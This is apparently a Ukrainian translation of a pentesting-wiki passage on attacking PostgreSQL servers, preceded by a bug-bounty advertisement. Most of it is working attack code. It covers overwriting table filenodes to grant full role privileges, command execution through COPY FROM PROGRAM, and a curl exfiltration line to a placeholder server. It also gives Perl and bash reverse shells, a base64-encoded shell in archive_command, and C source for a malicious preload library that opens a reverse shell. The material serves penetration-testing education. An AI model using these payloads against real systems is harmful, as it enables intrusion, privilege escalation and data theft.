**–ü–æ—Ä–∞–¥–∞ –¥–ª—è –±–∞–≥-–±–∞—É–Ω—Ç—ñ**: **–∑–∞—Ä–µ—î—Å—Ç—Ä—É–π—Ç–µ—Å—å** –Ω–∞ **Intigriti**, –ø—Ä–µ–º—ñ—É–º **–ø–ª–∞—Ç—Ñ–æ—Ä–º—ñ –¥–ª—è –±–∞–≥-–±–∞—É–Ω—Ç—ñ, —Å—Ç–≤–æ—Ä–µ–Ω—ñ–π —Ö–∞–∫–µ—Ä–∞–º–∏ –¥–ª—è —Ö–∞–∫–µ—Ä—ñ–≤**! –ü—Ä–∏—î–¥–Ω—É–π—Ç–µ—Å—å –¥–æ –Ω–∞—Å –Ω–∞ [**https://go.intigriti.com/hacktricks**](https://go.intigriti.com/hacktricks) —Å—å–æ–≥–æ–¥–Ω—ñ —Ç–∞ –ø–æ—á–Ω—ñ—Ç—å –∑–∞—Ä–æ–±–ª—è—Ç–∏ –≤–∏–Ω–∞–≥–æ—Ä–æ–¥–∏ –¥–æ **$100,000**!

{% embed url="https://go.intigriti.com/hacktricks" %}

### –û–Ω–æ–≤–ª–µ–Ω–Ω—è –¥–∞–Ω–∏—Ö —Ç–∞–±–ª–∏—Ü—ñ PostgreSQL —á–µ—Ä–µ–∑ –∑–∞–ø–∏—Å –ª–æ–∫–∞–ª—å–Ω–æ–≥–æ —Ñ–∞–π–ª—É

–Ø–∫—â–æ —É –≤–∞—Å —î –Ω–µ–æ–±—Ö—ñ–¥–Ω—ñ –¥–æ–∑–≤–æ–ª–∏ –¥–ª—è —á–∏—Ç–∞–Ω–Ω—è —Ç–∞ –∑–∞–ø–∏—Å—É —Ñ–∞–π–ª—ñ–≤ —Å–µ—Ä–≤–µ—Ä–∞ PostgreSQL, –≤–∏ –º–æ–∂–µ—Ç–µ –æ–Ω–æ–≤–∏—Ç–∏ –±—É–¥—å-—è–∫—É —Ç–∞–±–ª–∏—Ü—é –Ω–∞ —Å–µ—Ä–≤–µ—Ä—ñ, **–ø–µ—Ä–µ–∑–∞–ø–∏—Å–∞–≤—à–∏ –≤—ñ–¥–ø–æ–≤—ñ–¥–Ω–∏–π —Ñ–∞–π–ª –≤—É–∑–ª–∞** –≤ [–∫–∞—Ç–∞–ª–æ–∑—ñ –¥–∞–Ω–∏—Ö PostgreSQL](https://www.postgresql.org/docs/8.1/storage.html). **–ë—ñ–ª—å—à–µ –ø—Ä–æ —Ü—é —Ç–µ—Ö–Ω—ñ–∫—É** [**—Ç—É—Ç**](https://adeadfed.com/posts/updating-postgresql-data-without-update/#updating-custom-table-users).

–ù–µ–æ–±—Ö—ñ–¥–Ω—ñ –∫—Ä–æ–∫–∏:

1.  –û—Ç—Ä–∏–º–∞–π—Ç–µ –∫–∞—Ç–∞–ª–æ–≥ –¥–∞–Ω–∏—Ö PostgreSQL

```sql
SELECT setting FROM pg_settings WHERE name = 'data_directory';
```

**–ü—Ä–∏–º—ñ—Ç–∫–∞:** –Ø–∫—â–æ –≤–∏ –Ω–µ –º–æ–∂–µ—Ç–µ –æ—Ç—Ä–∏–º–∞—Ç–∏ –ø–æ—Ç–æ—á–Ω–∏–π —à–ª—è—Ö –¥–æ –∫–∞—Ç–∞–ª–æ–≥—É –¥–∞–Ω–∏—Ö –∑ –Ω–∞–ª–∞—à—Ç—É–≤–∞–Ω—å, –≤–∏ –º–æ–∂–µ—Ç–µ –∑–∞–ø–∏—Ç–∞—Ç–∏ –æ—Å–Ω–æ–≤–Ω—É –≤–µ—Ä—Å—ñ—é PostgreSQL —á–µ—Ä–µ–∑ –∑–∞–ø–∏—Ç `SELECT version()` —ñ —Å–ø—Ä–æ–±—É–≤–∞—Ç–∏ –ø–µ—Ä–µ–±—Ä–∞—Ç–∏ —à–ª—è—Ö. –ó–∞–≥–∞–ª—å–Ω—ñ —à–ª—è—Ö–∏ –¥–æ –∫–∞—Ç–∞–ª–æ–≥—É –¥–∞–Ω–∏—Ö –Ω–∞ Unix-—ñ–Ω—Å—Ç–∞–ª—è—Ü—ñ—è—Ö PostgreSQL: `/var/lib/PostgreSQL/MAJOR_VERSION/CLUSTER_NAME/`. –ó–∞–≥–∞–ª—å–Ω–µ —ñ–º'—è –∫–ª–∞—Å—Ç–µ—Ä–∞ - `main`.
2.  –û—Ç—Ä–∏–º–∞–π—Ç–µ –≤—ñ–¥–Ω–æ—Å–Ω–∏–π —à–ª—è—Ö –¥–æ —Ñ–∞–π–ª—É –≤—É–∑–ª–∞, –ø–æ–≤'—è–∑–∞–Ω–æ–≥–æ –∑ —Ü—ñ–ª—å–æ–≤–æ—é —Ç–∞–±–ª–∏—Ü–µ—é

```sql
SELECT pg_relation_filepath('{TABLE_NAME}')
```

–¶–µ–π –∑–∞–ø–∏—Ç –ø–æ–≤–∏–Ω–µ–Ω –ø–æ–≤–µ—Ä–Ω—É—Ç–∏ —â–æ—Å—å –Ω–∞ –∑—Ä–∞–∑–æ–∫ `base/3/1337`. –ü–æ–≤–Ω–∏–π —à–ª—è—Ö –Ω–∞ –¥–∏—Å–∫—É –±—É–¥–µ `$DATA_DIRECTORY/base/3/1337`, —Ç–æ–±—Ç–æ `/var/lib/postgresql/13/main/base/3/1337`.
3.  –ó–∞–≤–∞–Ω—Ç–∞–∂—Ç–µ —Ñ–∞–π–ª –≤—É–∑–ª–∞ —á–µ—Ä–µ–∑ —Ñ—É–Ω–∫—Ü—ñ—ó `lo_*`

```sql
SELECT lo_import('{PSQL_DATA_DIRECTORY}/{RELATION_FILEPATH}',13337)
```
4.  –û—Ç—Ä–∏–º–∞–π—Ç–µ —Ç–∏–ø –¥–∞–Ω–∏—Ö, –ø–æ–≤'—è–∑–∞–Ω–∏–π –∑ —Ü—ñ–ª—å–æ–≤–æ—é —Ç–∞–±–ª–∏—Ü–µ—é

```sql
SELECT
STRING_AGG(
CONCAT_WS(
',',
attname,
typname,
attlen,
attalign
),
';'
)
FROM pg_attribute
JOIN pg_type
ON pg_attribute.atttypid = pg_type.oid
JOIN pg_class
ON pg_attribute.attrelid = pg_class.oid
WHERE pg_class.relname = '{TABLE_NAME}';
```
5.  –í–∏–∫–æ—Ä–∏—Å—Ç–æ–≤—É–π—Ç–µ [PostgreSQL Filenode Editor](https://github.com/adeadfed/postgresql-filenode-editor) –¥–ª—è [—Ä–µ–¥–∞–≥—É–≤–∞–Ω–Ω—è —Ñ–∞–π–ª—É –≤—É–∑–ª–∞](https://adeadfed.com/posts/updating-postgresql-data-without-update/#updating-custom-table-users); –≤—Å—Ç–∞–Ω–æ–≤—ñ—Ç—å –≤—Å—ñ –±—É–ª–µ–≤—ñ –ø—Ä–∞–ø–æ—Ä–∏ `rol*` –Ω–∞ 1 –¥–ª—è –ø–æ–≤–Ω–∏—Ö –ø—Ä–∞–≤.

```bash
python3 postgresql_filenode_editor.py -f {FILENODE} --datatype-csv {DATATYPE_CSV_FROM_STEP_4} -m update -p 0 -i ITEM_ID --csv-data {CSV_DATA}
```

![–î–µ–º–æ–Ω—Å—Ç—Ä–∞—Ü—ñ—è PostgreSQL Filenode Editor](https://raw.githubusercontent.com/adeadfed/postgresql-filenode-editor/main/demo/demo\_datatype.gif)
6.  –ü–æ–≤—Ç–æ—Ä–Ω–æ –∑–∞–≤–∞–Ω—Ç–∞–∂—Ç–µ –≤—ñ–¥—Ä–µ–¥–∞–≥–æ–≤–∞–Ω–∏–π —Ñ–∞–π–ª –≤—É–∑–ª–∞ —á–µ—Ä–µ–∑ —Ñ—É–Ω–∫—Ü—ñ—ó `lo_*` —ñ –ø–µ—Ä–µ–∑–∞–ø–∏—à—ñ—Ç—å –æ—Ä–∏–≥—ñ–Ω–∞–ª—å–Ω–∏–π —Ñ–∞–π–ª –Ω–∞ –¥–∏—Å–∫—É

```sql
SELECT lo_from_bytea(13338,decode('{BASE64_ENCODED_EDITED_FILENODE}','base64'))
SELECT lo_export(13338,'{PSQL_DATA_DIRECTORY}/{RELATION_FILEPATH}')
```
7.  _(–û–ø—Ü—ñ–æ–Ω–∞–ª—å–Ω–æ)_ –û—á–∏—Å—Ç—ñ—Ç—å –∫–µ—à —Ç–∞–±–ª–∏—Ü—ñ –≤ –ø–∞–º'—è—Ç—ñ, –∑–∞–ø—É—Å—Ç–∏–≤—à–∏ –≤–∏—Ç—Ä–∞—Ç–Ω–∏–π SQL-–∑–∞–ø–∏—Ç

```sql
SELECT lo_from_bytea(133337, (SELECT REPEAT('a', 128*1024*1024))::bytea)
```
8. –¢–µ–ø–µ—Ä –≤–∏ –ø–æ–≤–∏–Ω–Ω—ñ –±–∞—á–∏—Ç–∏ –æ–Ω–æ–≤–ª–µ–Ω—ñ –∑–Ω–∞—á–µ–Ω–Ω—è —Ç–∞–±–ª–∏—Ü—ñ –≤ PostgreSQL.

–í–∏ —Ç–∞–∫–æ–∂ –º–æ–∂–µ—Ç–µ —Å—Ç–∞—Ç–∏ —Å—É–ø–µ—Ä–∞–¥–º—ñ–Ω—ñ—Å—Ç—Ä–∞—Ç–æ—Ä–æ–º, —Ä–µ–¥–∞–≥—É—é—á–∏ —Ç–∞–±–ª–∏—Ü—é `pg_authid`. **–î–∏–≤—ñ—Ç—å—Å—è** [**–Ω–∞—Å—Ç—É–ø–Ω–∏–π —Ä–æ–∑–¥—ñ–ª**](pentesting-postgresql.md#privesc-by-overwriting-internal-postgresql-tables).

## RCE

### **RCE –¥–æ –ø—Ä–æ–≥—Ä–∞–º–∏**

–û—Å–∫—ñ–ª—å–∫–∏[ –≤–µ—Ä—Å—ñ—è 9.3](https://www.postgresql.org/docs/9.3/release-9-3.html), —Ç—ñ–ª—å–∫–∏ **—Å—É–ø–µ—Ä–∫–æ—Ä–∏—Å—Ç—É–≤–∞—á—ñ** —Ç–∞ —á–ª–µ–Ω–∏ –≥—Ä—É–ø–∏ **`pg_execute_server_program`** –º–æ–∂—É—Ç—å –≤–∏–∫–æ—Ä–∏—Å—Ç–æ–≤—É–≤–∞—Ç–∏ copy –¥–ª—è RCE (–ø—Ä–∏–∫–ª–∞–¥ –∑ –µ–∫—Å—Ñ—ñ–ª—å—Ç—Ä–∞—Ü—ñ—î—é:
```sql
'; copy (SELECT '') to program 'curl http://YOUR-SERVER?f=`ls -l|base64`'-- -
```
–ü—Ä–∏–∫–ª–∞–¥ –¥–ª—è exec:
```bash
#PoC
DROP TABLE IF EXISTS cmd_exec;
CREATE TABLE cmd_exec(cmd_output text);
COPY cmd_exec FROM PROGRAM 'id';
SELECT * FROM cmd_exec;
DROP TABLE IF EXISTS cmd_exec;

#Reverse shell
#Notice that in order to scape a single quote you need to put 2 single quotes
COPY files FROM PROGRAM 'perl -MIO -e ''$p=fork;exit,if($p);$c=new IO::Socket::INET(PeerAddr,"192.168.0.104:80");STDIN->fdopen($c,r);$~->fdopen($c,w);system$_ while<>;''';
```
{% hint style="warning" %}
–ü–∞–º'—è—Ç–∞–π—Ç–µ, —â–æ —è–∫—â–æ –≤–∏ –Ω–µ —î —Å—É–ø–µ—Ä–∫–æ—Ä–∏—Å—Ç—É–≤–∞—á–µ–º, –∞–ª–µ –º–∞—î—Ç–µ –ø—Ä–∞–≤–∞ **`CREATEROLE`**, –≤–∏ –º–æ–∂–µ—Ç–µ **–¥–æ–¥–∞—Ç–∏ —Å–µ–±–µ –¥–æ —Ü—ñ—î—ó –≥—Ä—É–ø–∏:**
```sql
GRANT pg_execute_server_program TO username;
```
[**–ë—ñ–ª—å—à–µ —ñ–Ω—Ñ–æ—Ä–º–∞—Ü—ñ—ó.**](pentesting-postgresql.md#privilege-escalation-with-createrole)
{% endhint %}

–ê–±–æ –≤–∏–∫–æ—Ä–∏—Å—Ç–æ–≤—É–π—Ç–µ –º–æ–¥—É–ª—å `multi/postgres/postgres_copy_from_program_cmd_exec` –∑ **metasploit**.\
–ë—ñ–ª—å—à–µ —ñ–Ω—Ñ–æ—Ä–º–∞—Ü—ñ—ó –ø—Ä–æ —Ü—é –≤—Ä–∞–∑–ª–∏–≤—ñ—Å—Ç—å [**—Ç—É—Ç**](https://medium.com/greenwolf-security/authenticated-arbitrary-command-execution-on-postgresql-9-3-latest-cd18945914d5). –•–æ—á–∞ —Ü–µ –±—É–ª–æ –∑–∞—Ä–µ—î—Å—Ç—Ä–æ–≤–∞–Ω–æ —è–∫ CVE-2019-9193, Postges –æ–≥–æ–ª–æ—Å–∏–≤, —â–æ —Ü–µ [—Ñ—É–Ω–∫—Ü—ñ—è —ñ –Ω–µ –±—É–¥–µ –≤–∏–ø—Ä–∞–≤–ª–µ–Ω–æ](https://www.postgresql.org/about/news/cve-2019-9193-not-a-security-vulnerability-1935/).

### RCE –∑ –º–æ–≤–∞–º–∏ PostgreSQL

{% content-ref url="../pentesting-web/sql-injection/postgresql-injection/rce-with-postgresql-languages.md" %}
[rce-with-postgresql-languages.md](../pentesting-web/sql-injection/postgresql-injection/rce-with-postgresql-languages.md)
{% endcontent-ref %}

### RCE –∑ —Ä–æ–∑—à–∏—Ä–µ–Ω–Ω—è–º–∏ PostgreSQL

–Ø–∫—â–æ –≤–∏ **–Ω–∞–≤—á–∏–ª–∏—Å—è** –∑ –ø–æ–ø–µ—Ä–µ–¥–Ω—å–æ–≥–æ –ø–æ—Å—Ç—É **—è–∫ –∑–∞–≤–∞–Ω—Ç–∞–∂—É–≤–∞—Ç–∏ –±—ñ–Ω–∞—Ä–Ω—ñ —Ñ–∞–π–ª–∏**, –≤–∏ –º–æ–∂–µ—Ç–µ —Å–ø—Ä–æ–±—É–≤–∞—Ç–∏ –æ—Ç—Ä–∏–º–∞—Ç–∏ **RCE, –∑–∞–≤–∞–Ω—Ç–∞–∂—É—é—á–∏ —Ä–æ–∑—à–∏—Ä–µ–Ω–Ω—è postgresql —ñ –∑–∞–≤–∞–Ω—Ç–∞–∂—É—é—á–∏ –π–æ–≥–æ**.

{% content-ref url="../pentesting-web/sql-injection/postgresql-injection/rce-with-postgresql-extensions.md" %}
[rce-with-postgresql-extensions.md](../pentesting-web/sql-injection/postgresql-injection/rce-with-postgresql-extensions.md)
{% endcontent-ref %}

### RCE –∑ –∫–æ–Ω—Ñ—ñ–≥—É—Ä–∞—Ü—ñ–π–Ω–æ–≥–æ —Ñ–∞–π–ª—É PostgreSQL

{% hint style="info" %}
–ù–∞—Å—Ç—É–ø–Ω—ñ –≤–µ–∫—Ç–æ—Ä–∏ RCE –æ—Å–æ–±–ª–∏–≤–æ –∫–æ—Ä–∏—Å–Ω—ñ –≤ –æ–±–º–µ–∂–µ–Ω–∏—Ö –∫–æ–Ω—Ç–µ–∫—Å—Ç–∞—Ö SQLi, –æ—Å–∫—ñ–ª—å–∫–∏ –≤—Å—ñ –∫—Ä–æ–∫–∏ –º–æ–∂—É—Ç—å –±—É—Ç–∏ –≤–∏–∫–æ–Ω–∞–Ω—ñ —á–µ—Ä–µ–∑ –≤–∫–ª–∞–¥–µ–Ω—ñ –æ–ø–µ—Ä–∞—Ç–æ—Ä–∏ SELECT
{% endhint %}

**–ö–æ–Ω—Ñ—ñ–≥—É—Ä–∞—Ü—ñ–π–Ω–∏–π —Ñ–∞–π–ª** PostgreSQL —î **–∑–∞–ø–∏—Å—É–≤–∞–Ω–∏–º** –∫–æ—Ä–∏—Å—Ç—É–≤–∞—á–µ–º **postgres**, —è–∫–∏–π –∑–∞–ø—É—Å–∫–∞—î –±–∞–∑—É –¥–∞–Ω–∏—Ö, —Ç–æ–º—É —è–∫ **—Å—É–ø–µ—Ä–∫–æ—Ä–∏—Å—Ç—É–≤–∞—á**, –≤–∏ –º–æ–∂–µ—Ç–µ –∑–∞–ø–∏—Å—É–≤–∞—Ç–∏ —Ñ–∞–π–ª–∏ –≤ —Ñ–∞–π–ª–æ–≤—ñ–π —Å–∏—Å—Ç–µ–º—ñ, –∞ –æ—Ç–∂–µ, –≤–∏ –º–æ–∂–µ—Ç–µ **–ø–µ—Ä–µ–∑–∞–ø–∏—Å–∞—Ç–∏ —Ü–µ–π —Ñ–∞–π–ª.**

![](<../.gitbook/assets/image (322).png>)

#### **RCE –∑ ssl\_passphrase\_command**

–ë—ñ–ª—å—à–µ —ñ–Ω—Ñ–æ—Ä–º–∞—Ü—ñ—ó [–ø—Ä–æ —Ü—é —Ç–µ—Ö–Ω—ñ–∫—É —Ç—É—Ç](https://pulsesecurity.co.nz/articles/postgres-sqli).

–ö–æ–Ω—Ñ—ñ–≥—É—Ä–∞—Ü—ñ–π–Ω–∏–π —Ñ–∞–π–ª –º–∞—î –∫—ñ–ª—å–∫–∞ —Ü—ñ–∫–∞–≤–∏—Ö –∞—Ç—Ä–∏–±—É—Ç—ñ–≤, —è–∫—ñ –º–æ–∂—É—Ç—å –ø—Ä–∏–∑–≤–µ—Å—Ç–∏ –¥–æ RCE:

* `ssl_key_file = '/etc/ssl/private/ssl-cert-snakeoil.key'` –®–ª—è—Ö –¥–æ –ø—Ä–∏–≤–∞—Ç–Ω–æ–≥–æ –∫–ª—é—á–∞ –±–∞–∑–∏ –¥–∞–Ω–∏—Ö
* `ssl_passphrase_command = ''` –Ø–∫—â–æ –ø—Ä–∏–≤–∞—Ç–Ω–∏–π —Ñ–∞–π–ª –∑–∞—Ö–∏—â–µ–Ω–∏–π –ø–∞—Ä–æ–ª–µ–º (—à–∏—Ñ—Ä–æ–≤–∞–Ω–∏–π), postgresql **–≤–∏–∫–æ–Ω–∞—î –∫–æ–º–∞–Ω–¥—É, –≤–∫–∞–∑–∞–Ω—É –≤ —Ü—å–æ–º—É –∞—Ç—Ä–∏–±—É—Ç—ñ**.
* `ssl_passphrase_command_supports_reload = off` **–Ø–∫—â–æ** —Ü–µ–π –∞—Ç—Ä–∏–±—É—Ç **–≤–∫–ª—é—á–µ–Ω–∏–π**, **–∫–æ–º–∞–Ω–¥–∞**, —â–æ –≤–∏–∫–æ–Ω—É—î—Ç—å—Å—è, —è–∫—â–æ –∫–ª—é—á –∑–∞—Ö–∏—â–µ–Ω–∏–π –ø–∞—Ä–æ–ª–µ–º, **–±—É–¥–µ –≤–∏–∫–æ–Ω–∞–Ω–∞** –ø—ñ–¥ —á–∞—Å –≤–∏–∫–æ–Ω–∞–Ω–Ω—è `pg_reload_conf()`.

–û—Ç–∂–µ, –∑–ª–æ–≤–º–∏—Å–Ω–∏–∫—É –ø–æ—Ç—Ä—ñ–±–Ω–æ:

1. **–°–∫–∏–Ω—É—Ç–∏ –ø—Ä–∏–≤–∞—Ç–Ω–∏–π –∫–ª—é—á** –∑ —Å–µ—Ä–≤–µ—Ä–∞
2. **–ó–∞—à–∏—Ñ—Ä—É–≤–∞—Ç–∏** –∑–∞–≤–∞–Ω—Ç–∞–∂–µ–Ω–∏–π –ø—Ä–∏–≤–∞—Ç–Ω–∏–π –∫–ª—é—á:
1. `rsa -aes256 -in downloaded-ssl-cert-snakeoil.key -out ssl-cert-snakeoil.key`
3. **–ü–µ—Ä–µ–∑–∞–ø–∏—Å–∞—Ç–∏**
4. **–°–∫–∏–Ω—É—Ç–∏** –ø–æ—Ç–æ—á–Ω—É **–∫–æ–Ω—Ñ—ñ–≥—É—Ä–∞—Ü—ñ—é postgresql**
5. **–ü–µ—Ä–µ–∑–∞–ø–∏—Å–∞—Ç–∏** **–∫–æ–Ω—Ñ—ñ–≥—É—Ä–∞—Ü—ñ—é** –∑ –≤–∫–∞–∑–∞–Ω–∏–º–∏ –∞—Ç—Ä–∏–±—É—Ç–∞–º–∏:
1. `ssl_passphrase_command = 'bash -c "bash -i >& /dev/tcp/127.0.0.1/8111 0>&1"'`
2. `ssl_passphrase_command_supports_reload = on`
6. –í–∏–∫–æ–Ω–∞—Ç–∏ `pg_reload_conf()`

–ü—ñ–¥ —á–∞—Å —Ç–µ—Å—Ç—É–≤–∞–Ω–Ω—è —è –ø–æ–º—ñ—Ç–∏–≤, —â–æ —Ü–µ –±—É–¥–µ –ø—Ä–∞—Ü—é–≤–∞—Ç–∏ –ª–∏—à–µ —è–∫—â–æ **—Ñ–∞–π–ª –ø—Ä–∏–≤–∞—Ç–Ω–æ–≥–æ –∫–ª—é—á–∞ –º–∞—î –ø—Ä–∏–≤—ñ–ª–µ—ó 640**, –≤—ñ–Ω **–Ω–∞–ª–µ–∂–∏—Ç—å root** —ñ –≥—Ä—É–ø—ñ **ssl-cert –∞–±–æ postgres** (—â–æ–± –∫–æ—Ä–∏—Å—Ç—É–≤–∞—á postgres –º—ñ–≥ –π–æ–≥–æ —á–∏—Ç–∞—Ç–∏), —ñ —Ä–æ–∑–º—ñ—â–µ–Ω–∏–π —É _/var/lib/postgresql/12/main_.

#### **RCE –∑ archive\_command**

**–ë—ñ–ª—å—à–µ** [**—ñ–Ω—Ñ–æ—Ä–º–∞—Ü—ñ—ó –ø—Ä–æ —Ü—é –∫–æ–Ω—Ñ—ñ–≥—É—Ä–∞—Ü—ñ—é —Ç–∞ –ø—Ä–æ WAL —Ç—É—Ç**](https://medium.com/dont-code-me-on-that/postgres-sql-injection-to-rce-with-archive-command-c8ce955cf3d3)**.**

–©–µ –æ–¥–∏–Ω –∞—Ç—Ä–∏–±—É—Ç —É –∫–æ–Ω—Ñ—ñ–≥—É—Ä–∞—Ü—ñ–π–Ω–æ–º—É —Ñ–∞–π–ª—ñ, —è–∫–∏–π –º–æ–∂–Ω–∞ –µ–∫—Å–ø–ª—É–∞—Ç—É–≤–∞—Ç–∏, —Ü–µ `archive_command`.

–î–ª—è —Ü—å–æ–≥–æ `archive_mode` –º–∞—î –±—É—Ç–∏ `'on'` –∞–±–æ `'always'`. –Ø–∫—â–æ —Ü–µ –ø—Ä–∞–≤–¥–∞, —Ç–æ –º–∏ –º–æ–∂–µ–º–æ –ø–µ—Ä–µ–∑–∞–ø–∏—Å–∞—Ç–∏ –∫–æ–º–∞–Ω–¥—É –≤ `archive_command` —ñ –∑–º—É—Å–∏—Ç–∏ —ó—ó –≤–∏–∫–æ–Ω–∞—Ç–∏—Å—è —á–µ—Ä–µ–∑ –æ–ø–µ—Ä–∞—Ü—ñ—ó WAL (–∂—É—Ä–Ω–∞–ª –ø–æ–ø–µ—Ä–µ–¥–Ω—å–æ–≥–æ –∑–∞–ø–∏—Å—É).

–ó–∞–≥–∞–ª—å–Ω—ñ –∫—Ä–æ–∫–∏:

1. –ü–µ—Ä–µ–≤—ñ—Ä—Ç–µ, —á–∏ —É–≤—ñ–º–∫–Ω–µ–Ω–æ —Ä–µ–∂–∏–º –∞—Ä—Ö—ñ–≤—É–≤–∞–Ω–Ω—è: `SELECT current_setting('archive_mode')`
2. –ü–µ—Ä–µ–∑–∞–ø–∏—à—ñ—Ç—å `archive_command` –∑ –∫–æ—Ä–∏—Å–Ω–∏–º –Ω–∞–≤–∞–Ω—Ç–∞–∂–µ–Ω–Ω—è–º. –ù–∞–ø—Ä–∏–∫–ª–∞–¥, –∑–≤–æ—Ä–æ—Ç–Ω–∏–π —à–µ–ª–ª: `archive_command = 'echo "dXNlIFNvY2tldDskaT0iMTAuMC4wLjEiOyRwPTQyNDI7c29ja2V0KFMsUEZfSU5FVCxTT0NLX1NUUkVBTSxnZXRwcm90b2J5bmFtZSgidGNwIikpO2lmKGNvbm5lY3QoUyxzb2NrYWRkcl9pbigkcCxpbmV0X2F0b24oJGkpKSkpe29wZW4oU1RESU4sIj4mUyIpO29wZW4oU1RET1VULCI+JlMiKTtvcGVuKFNUREVSUiwiPiZTIik7ZXhlYygiL2Jpbi9zaCAtaSIpO307" | base64 --decode | perl'`
3. –ü–µ—Ä–µ–∑–∞–≤–∞–Ω—Ç–∞–∂—Ç–µ –∫–æ–Ω—Ñ—ñ–≥—É—Ä–∞—Ü—ñ—é: `SELECT pg_reload_conf()`
4. –ü—Ä–∏–º—É—Å—å—Ç–µ –æ–ø–µ—Ä–∞—Ü—ñ—é WAL –≤–∏–∫–æ–Ω–∞—Ç–∏—Å—è, —â–æ –≤–∏–∫–ª–∏—á–µ –∫–æ–º–∞–Ω–¥—É –∞—Ä—Ö—ñ–≤—É–≤–∞–Ω–Ω—è: `SELECT pg_switch_wal()` –∞–±–æ `SELECT pg_switch_xlog()` –¥–ª—è –¥–µ—è–∫–∏—Ö –≤–µ—Ä—Å—ñ–π Postgres

#### **RCE –∑ –ø–æ–ø–µ—Ä–µ–¥–Ω—å–æ –∑–∞–≤–∞–Ω—Ç–∞–∂–µ–Ω–∏–º–∏ –±—ñ–±–ª—ñ–æ—Ç–µ–∫–∞–º–∏**

–ë—ñ–ª—å—à–µ —ñ–Ω—Ñ–æ—Ä–º–∞—Ü—ñ—ó [–ø—Ä–æ —Ü—é —Ç–µ—Ö–Ω—ñ–∫—É —Ç—É—Ç](https://adeadfed.com/posts/postgresql-select-only-rce/).

–¶–µ–π –≤–µ–∫—Ç–æ—Ä –∞—Ç–∞–∫–∏ –≤–∏–∫–æ—Ä–∏—Å—Ç–æ–≤—É—î –Ω–∞—Å—Ç—É–ø–Ω—ñ –∑–º—ñ–Ω–Ω—ñ –∫–æ–Ω—Ñ—ñ–≥—É—Ä–∞—Ü—ñ—ó:

* `session_preload_libraries` -- –±—ñ–±–ª—ñ–æ—Ç–µ–∫–∏, —è–∫—ñ –±—É–¥—É—Ç—å –∑–∞–≤–∞–Ω—Ç–∞–∂–µ–Ω—ñ —Å–µ—Ä–≤–µ—Ä–æ–º PostgreSQL –ø—ñ–¥ —á–∞—Å –ø—ñ–¥–∫–ª—é—á–µ–Ω–Ω—è –∫–ª—ñ—î–Ω—Ç–∞.
* `dynamic_library_path` -- —Å–ø–∏—Å–æ–∫ –¥–∏—Ä–µ–∫—Ç–æ—Ä—ñ–π, –¥–µ —Å–µ—Ä–≤–µ—Ä PostgreSQL —à—É–∫–∞—Ç–∏–º–µ –±—ñ–±–ª—ñ–æ—Ç–µ–∫–∏.

–ú–∏ –º–æ–∂–µ–º–æ –≤—Å—Ç–∞–Ω–æ–≤–∏—Ç–∏ –∑–Ω–∞—á–µ–Ω–Ω—è `dynamic_library_path` –Ω–∞ –¥–∏—Ä–µ–∫—Ç–æ—Ä—ñ—é, –∑–∞–ø–∏—Å—É–≤–∞–Ω—É –∫–æ—Ä–∏—Å—Ç—É–≤–∞—á–µ–º `postgres`, —â–æ –∑–∞–ø—É—Å–∫–∞—î –±–∞–∑—É –¥–∞–Ω–∏—Ö, –Ω–∞–ø—Ä–∏–∫–ª–∞–¥, –¥–∏—Ä–µ–∫—Ç–æ—Ä—ñ—é `/tmp/`, —ñ –∑–∞–≤–∞–Ω—Ç–∞–∂–∏—Ç–∏ —Ç—É–¥–∏ —à–∫—ñ–¥–ª–∏–≤–∏–π –æ–±'—î–∫—Ç `.so`. –î–∞–ª—ñ –º–∏ –∑–º—É—Å–∏–º–æ —Å–µ—Ä–≤–µ—Ä PostgreSQL –∑–∞–≤–∞–Ω—Ç–∞–∂–∏—Ç–∏ –Ω–∞—à—É –Ω–æ–≤—É –±—ñ–±–ª—ñ–æ—Ç–µ–∫—É, –≤–∫–ª—é—á–∏–≤—à–∏ —ó—ó –≤ –∑–º—ñ–Ω–Ω—É `session_preload_libraries`.

–ö—Ä–æ–∫–∏ –∞—Ç–∞–∫–∏:

1. –ó–∞–≤–∞–Ω—Ç–∞–∂—Ç–µ –æ—Ä–∏–≥—ñ–Ω–∞–ª—å–Ω–∏–π `postgresql.conf`
2. –í–∫–ª—é—á—ñ—Ç—å –¥–∏—Ä–µ–∫—Ç–æ—Ä—ñ—é `/tmp/` —É –∑–Ω–∞—á–µ–Ω–Ω—è `dynamic_library_path`, –Ω–∞–ø—Ä–∏–∫–ª–∞–¥, `dynamic_library_path = '/tmp:$libdir'`
3. –í–∫–ª—é—á—ñ—Ç—å —ñ–º'—è —à–∫—ñ–¥–ª–∏–≤–æ—ó –±—ñ–±–ª—ñ–æ—Ç–µ–∫–∏ –≤ –∑–Ω–∞—á–µ–Ω–Ω—è `session_preload_libraries`, –Ω–∞–ø—Ä–∏–∫–ª–∞–¥, `session_preload_libraries = 'payload.so'`
4. –ü–µ—Ä–µ–≤—ñ—Ä—Ç–µ –æ—Å–Ω–æ–≤–Ω—É –≤–µ—Ä—Å—ñ—é PostgreSQL –∑–∞ –¥–æ–ø–æ–º–æ–≥–æ—é –∑–∞–ø–∏—Ç—É `SELECT version()`
5. –°–∫–æ–º–ø—ñ–ª—é–π—Ç–µ –∫–æ–¥ —à–∫—ñ–¥–ª–∏–≤–æ—ó –±—ñ–±–ª—ñ–æ—Ç–µ–∫–∏ –∑ –ø—Ä–∞–≤–∏–ª—å–Ω–∏–º –ø–∞–∫–µ—Ç–æ–º —Ä–æ–∑—Ä–æ–±–Ω–∏–∫–∞ PostgreSQL –ü—Ä–∏–∫–ª–∞–¥ –∫–æ–¥—É:

```c
#include <stdio.h>
#include <sys/socket.h>
#include <sys/types.h>
#include <stdlib.h>
#include <unistd.h>
#include <netinet/in.h>
#include <arpa/inet.h>
#include "postgres.h"
#include "fmgr.h"

#ifdef PG_MODULE_MAGIC
PG_MODULE_MAGIC;
#endif

void _init() {
/*
–∫–æ–¥ –≤–∑—è—Ç–∏–π –∑ https://www.revshells.com/
*/

int port = REVSHELL_PORT;
struct sockaddr_in revsockaddr;

int sockt = socket(AF_INET, SOCK_STREAM, 0);
revsockaddr.sin_family = AF_INET;
revsockaddr.sin_port = htons(port);
revsockaddr.sin_addr.s_addr = inet_addr("REVSHELL_IP");

connect(sockt, (struct sockaddr *) &revsockaddr,
sizeof(revsockaddr));
dup2(sockt, 0);
dup2(sockt, 1);
dup2(sockt, 2);

char * const argv[] = {"/bin/bash", NULL};
execve("/bin/bash", argv, NULL);
}
```

–ö–æ–º–ø—ñ–ª—ñ—Ä—É–≤–∞–Ω–Ω—è –∫–æ–¥—É:

```bash
gcc -I$(pg_config --includedir-server) -shared -fPIC -nostartfiles -o payload.so payload.c
```
